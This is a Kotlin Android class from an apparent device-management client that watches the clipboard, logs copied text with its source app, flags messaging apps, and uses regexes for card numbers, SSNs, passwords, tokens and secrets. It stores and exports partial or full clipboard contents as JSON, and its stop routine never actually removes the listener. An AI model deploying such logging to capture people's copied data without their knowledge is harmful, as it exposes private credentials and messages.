package com.rdm.client

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import org.json.JSONObject

/**
 * Monitors clipboard changes to detect data exfiltration attempts
 */
class ClipboardMonitor(private val context: Context) {
    private val TAG = "ClipboardMonitor"

    private val clipboardManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
    private val scope = CoroutineScope(Dispatchers.Default + SupervisorJob())

    // State
    private val _isMonitoring = MutableStateFlow(false)
    val isMonitoring: StateFlow<Boolean> = _isMonitoring.asStateFlow()

    private var lastClipContent: String? = null
    private var lastClipTimestamp: Long = 0
    private var currentApp: String? = null
    private var onClipboardEvent: ((ClipboardEvent) -> Unit)? = null

    // Event logging
    private val eventLog = mutableListOf<ClipboardEvent>()

    data class ClipboardEvent(
        val eventType: ClipboardEventType,
        val timestamp: Long,
        val packageName: String?,
        val content: String,
        val contentLength: Int,
        val isSensitive: Boolean,
        val details: Map<String, Any>
    )

    enum class ClipboardEventType {
        CLIPBOARD_COPIED,
        CLIPBOARD_PASTED,
        SENSITIVE_DATA_COPIED,
        POTENTIAL_EXFILTRATION,
        LARGE_DATA_COPIED,
        REPEATED_COPY_PATTERN
    }

    fun setEventCallback(callback: (ClipboardEvent) -> Unit) {
        onClipboardEvent = callback
    }

    fun startMonitoring() {
        if (_isMonitoring.value) {
            Log.w(TAG, "Clipboard monitoring already active")
            return
        }

        _isMonitoring.value = true

        val clipboardListener = ClipboardManager.OnPrimaryClipChangedListener {
            handleClipboardChange()
        }

        clipboardManager.addPrimaryClipChangedListener(clipboardListener)

        Log.d(TAG, "Clipboard monitoring started")
    }

    fun stopMonitoring() {
        if (!_isMonitoring.value) {
            return
        }

        _isMonitoring.value = false
        clipboardManager.removePrimaryClipChangedListener { }

        Log.d(TAG, "Clipboard monitoring stopped")
    }

    fun setCurrentApp(packageName: String?) {
        currentApp = packageName
    }

    private fun handleClipboardChange() {
        val clipData = clipboardManager.primaryClip ?: return
        val timestamp = System.currentTimeMillis()

        if (clipData.itemCount > 0) {
            val clipItem = clipData.getItemAt(0)
            val clipText = clipItem.text?.toString() ?: clipItem.uri?.toString() ?: ""

            if (clipText.isNotEmpty()) {
                analyzeClipboardContent(clipText, timestamp)
            }
        }
    }

    private fun analyzeClipboardContent(content: String, timestamp: Long) {
        val contentLength = content.length
        val isSensitive = detectSensitiveContent(content)
        val isLargeData = contentLength > 1000
        val isRepeatedContent = content == lastClipContent

        val eventType = when {
            isSensitive && currentApp in getMonitoredApps() -> ClipboardEventType.SENSITIVE_DATA_COPIED
            isSensitive && currentApp !in getMonitoredApps() -> ClipboardEventType.POTENTIAL_EXFILTRATION
            isLargeData -> ClipboardEventType.LARGE_DATA_COPIED
            isRepeatedContent -> ClipboardEventType.REPEATED_COPY_PATTERN
            else -> ClipboardEventType.CLIPBOARD_COPIED
        }

        val event = ClipboardEvent(
            eventType = eventType,
            timestamp = timestamp,
            packageName = currentApp,
            content = if (isSensitive || contentLength > 500) content.take(100) + "..." else content,
            contentLength = contentLength,
            isSensitive = isSensitive,
            details = mapOf(
                "is_large_data" to isLargeData,
                "is_repeated" to isRepeatedContent,
                "source_app" to (currentApp ?: "unknown"),
                "content_type" to detectContentType(content)
            )
        )

        logEvent(event)

        lastClipContent = content
        lastClipTimestamp = timestamp

        onClipboardEvent?.invoke(event)
    }

    private fun detectSensitiveContent(content: String): Boolean {
        val sensitivePatterns = listOf(
            Regex("\\b\\d{16}\\b"), // Credit card
            Regex("\\b\\d{4}-\\d{4}-\\d{4}-\\d{4}\\b"), // Credit card with dashes
            Regex("\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b"), // Email
            Regex("\\b\\d{3}-\\d{2}-\\d{4}\\b"), // SSN
            Regex("\\b\\d{10,}\\b"), // Phone number
            Regex("(?i)password"), // Password keyword
            Regex("(?i)api[_-]?key"), // API key
            Regex("(?i)token"), // Token
            Regex("(?i)secret"), // Secret
            Regex("[A-Za-z0-9+/]{32,}={0,2}") // Base64 encoded data
        )

        return sensitivePatterns.any { it.find(content) != null }
    }

    private fun detectContentType(content: String): String {
        return when {
            content.matches(Regex("\\d+")) -> "phone_number"
            content.contains("@") && content.contains(".") -> "email"
            content.matches(Regex("\\b\\d{16}\\b")) -> "credit_card"
            content.matches(Regex("\\b\\d{3}-\\d{2}-\\d{4}\\b")) -> "ssn"
            content.contains("http") -> "url"
            content.length > 100 -> "large_text"
            else -> "general_text"
        }
    }

    private fun getMonitoredApps(): Set<String> {
        return setOf(
            "com.whatsapp",
            "com.telegram.messenger",
            "jp.naver.line.android",
            "com.viber.voip",
            "com.discord",
            "com.facebook.orca",
            "com.snapchat.android",
            "com.instagram.android"
        )
    }

    private fun logEvent(event: ClipboardEvent) {
        synchronized(eventLog) {
            eventLog.add(event)
            if (eventLog.size > 500) {
                eventLog.removeAt(0)
            }
        }

        val logMessage = buildString {
            append("[${event.eventType.name}]")
            append(" App: ${event.packageName}")
            append(" Length: ${event.contentLength}")
            if (event.isSensitive) append(" [SENSITIVE]")
        }

        when (event.eventType) {
            ClipboardEventType.POTENTIAL_EXFILTRATION -> Log.w(TAG, "⚠️ $logMessage")
            ClipboardEventType.SENSITIVE_DATA_COPIED -> Log.w(TAG, "🔒 $logMessage")
            else -> Log.i(TAG, logMessage)
        }
    }

    fun getEventLog(): List<ClipboardEvent> {
        synchronized(eventLog) {
            return eventLog.toList()
        }
    }

    fun getRecentEvents(count: Int = 50): List<ClipboardEvent> {
        synchronized(eventLog) {
            return eventLog.takeLast(count)
        }
    }

    fun getEventsAsJson(): String {
        val events = getRecentEvents(100)
        val jsonArray = org.json.JSONArray()

        for (event in events) {
            val eventJson = JSONObject().apply {
                put("event_type", event.eventType.name)
                put("timestamp", event.timestamp)
                put("package_name", event.packageName)
                put("content", event.content)
                put("content_length", event.contentLength)
                put("is_sensitive", event.isSensitive)
                put("details", JSONObject(event.details))
            }
            jsonArray.put(eventJson)
        }

        return jsonArray.toString()
    }

    fun clearLog() {
        synchronized(eventLog) {
            eventLog.clear()
        }
    }

    fun cleanup() {
        stopMonitoring()
        scope.cancel()
    }
}
